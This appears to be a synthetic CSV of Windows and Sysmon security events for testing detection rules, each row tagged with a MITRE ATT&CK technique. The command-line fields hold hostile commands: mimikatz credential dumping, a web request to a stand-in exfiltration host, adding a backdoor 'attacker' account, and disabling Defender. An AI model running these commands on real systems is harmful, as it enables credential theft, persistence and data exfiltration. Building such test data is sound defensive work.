timestamp,sourcetype,EventCode,MITRE_Technique,Description,CommandLine,NewProcessName,Source_Network_Address,DestinationPort,User,ParentProcessName
2024-05-28 14:50:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.121,8080,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 14:55:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.126,3389,Administrator,C:\Windows\System32\explorer.exe
2024-05-28 15:00:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.147,80,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 15:05:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 13,C:\Simulated\mstsc.exe,192.168.56.141,8080,testuser,C:\Windows\System32\explorer.exe
2024-05-28 15:10:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.108,8080,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 15:15:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.148,443,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 15:20:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.116,8443,SYSTEM,C:\Windows\System32\cmd.exe
2024-05-28 15:25:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.130,80,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 15:30:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.124,3389,SYSTEM,C:\Windows\System32\cmd.exe
2024-05-28 15:35:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.144,80,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 15:40:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.118,22,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 15:45:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.110,8443,SYSTEM,C:\Windows\System32\explorer.exe
2024-05-28 15:50:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.103,3389,testuser,C:\Windows\System32\cmd.exe
2024-05-28 15:55:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 23,C:\Simulated\mstsc.exe,192.168.56.100,445,Administrator,C:\Windows\System32\explorer.exe
2024-05-28 16:00:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.131,8080,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 16:05:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.136,80,SYSTEM,C:\Windows\System32\cmd.exe
2024-05-28 16:10:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.124,443,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 16:15:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.144,445,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 16:20:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.105,8080,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 16:25:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.147,3389,SYSTEM,C:\Windows\System32\explorer.exe
2024-05-28 16:30:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.141,22,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 16:35:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.138,8080,Administrator,C:\Windows\System32\explorer.exe
2024-05-28 16:40:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.136,445,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 16:45:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 33,C:\Simulated\mstsc.exe,192.168.56.123,3389,Administrator,C:\Windows\System32\explorer.exe
2024-05-28 16:50:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.119,445,SYSTEM,C:\Windows\System32\explorer.exe
2024-05-28 16:55:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.130,8443,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 17:00:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.121,443,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 17:05:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.111,3389,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 17:10:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.116,445,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 17:15:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.137,22,jdoe,C:\Windows\System32\explorer.exe
2024-05-28 17:20:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.138,8080,SYSTEM,C:\Windows\System32\cmd.exe
2024-05-28 17:25:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.137,3389,jdoe,C:\Windows\System32\explorer.exe
2024-05-28 17:30:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.107,445,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 17:35:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 43,C:\Simulated\mstsc.exe,192.168.56.150,445,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 17:40:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.133,80,testuser,C:\Windows\System32\explorer.exe
2024-05-28 17:45:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.108,22,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 17:50:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.107,22,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 17:55:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.120,3389,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 18:00:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.148,8443,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 18:05:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.116,22,testuser,C:\Windows\System32\explorer.exe
2024-05-28 18:10:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.128,445,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 18:15:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.144,445,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 18:20:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.105,445,testuser,C:\Windows\System32\cmd.exe
2024-05-28 18:25:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 53,C:\Simulated\mstsc.exe,192.168.56.149,3389,Administrator,C:\Windows\System32\explorer.exe
2024-05-28 18:30:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.143,445,SYSTEM,C:\Windows\System32\explorer.exe
2024-05-28 18:35:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.100,445,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 18:40:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.115,80,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 18:45:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.109,445,testuser,C:\Windows\System32\cmd.exe
2024-05-28 18:50:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.139,22,testuser,C:\Windows\System32\cmd.exe
2024-05-28 18:55:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.125,8080,Administrator,C:\Windows\System32\explorer.exe
2024-05-28 19:00:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.137,8080,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 19:05:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.117,445,testuser,C:\Windows\System32\explorer.exe
2024-05-28 19:10:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.138,8080,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 19:15:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 63,C:\Simulated\mstsc.exe,192.168.56.130,80,Administrator,C:\Windows\System32\explorer.exe
2024-05-28 19:20:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.147,443,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 19:25:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.148,80,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 19:30:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.131,445,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 19:35:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.115,443,testuser,C:\Windows\System32\cmd.exe
2024-05-28 19:40:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.113,443,SYSTEM,C:\Windows\System32\cmd.exe
2024-05-28 19:45:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.117,443,jdoe,C:\Windows\System32\explorer.exe
2024-05-28 19:50:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.119,8443,testuser,C:\Windows\System32\cmd.exe
2024-05-28 19:55:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.140,443,SYSTEM,C:\Windows\System32\explorer.exe
2024-05-28 20:00:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.126,80,SYSTEM,C:\Windows\System32\cmd.exe
2024-05-28 20:05:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 73,C:\Simulated\mstsc.exe,192.168.56.103,3389,testuser,C:\Windows\System32\explorer.exe
2024-05-28 20:10:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.124,80,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 20:15:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.126,445,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 20:20:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.139,80,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 20:25:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.101,3389,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 20:30:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.115,80,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 20:35:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.101,8080,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 20:40:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.146,445,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 20:45:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.104,8443,SYSTEM,C:\Windows\System32\explorer.exe
2024-05-28 20:50:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.131,443,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 20:55:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 83,C:\Simulated\mstsc.exe,192.168.56.133,3389,jdoe,C:\Windows\System32\explorer.exe
2024-05-28 21:00:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.149,8080,SYSTEM,C:\Windows\System32\explorer.exe
2024-05-28 21:05:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.110,8080,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 21:10:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.116,22,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 21:15:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.145,8080,SYSTEM,C:\Windows\System32\cmd.exe
2024-05-28 21:20:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.139,445,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 21:25:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.147,443,jdoe,C:\Windows\System32\explorer.exe
2024-05-28 21:30:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.101,3389,SYSTEM,C:\Windows\System32\cmd.exe
2024-05-28 21:35:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.149,8080,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 21:40:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.104,80,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 21:45:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 93,C:\Simulated\mstsc.exe,192.168.56.143,3389,Administrator,C:\Windows\System32\explorer.exe
2024-05-28 21:50:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.109,445,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 21:55:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.106,8443,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 22:00:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.120,443,testuser,C:\Windows\System32\cmd.exe
2024-05-28 22:05:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.105,8443,testuser,C:\Windows\System32\cmd.exe
2024-05-28 22:10:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.114,80,SYSTEM,C:\Windows\System32\cmd.exe
2024-05-28 22:15:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.121,22,SYSTEM,C:\Windows\System32\explorer.exe
2024-05-28 14:00:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.103,8443,Administrator,C:\Windows\System32\services.exe
2024-05-28 14:02:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.143,3389,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 14:04:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.150,443,Administrator,C:\Windows\System32\lsass.exe
2024-05-28 14:06:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 3,C:\Simulated\mstsc.exe,192.168.56.144,22,Administrator,C:\Windows\System32\smss.exe
2024-05-28 14:08:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.143,445,jdoe,C:\Windows\System32\smss.exe
2024-05-28 14:10:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.116,445,testuser,C:\Windows\System32\lsass.exe
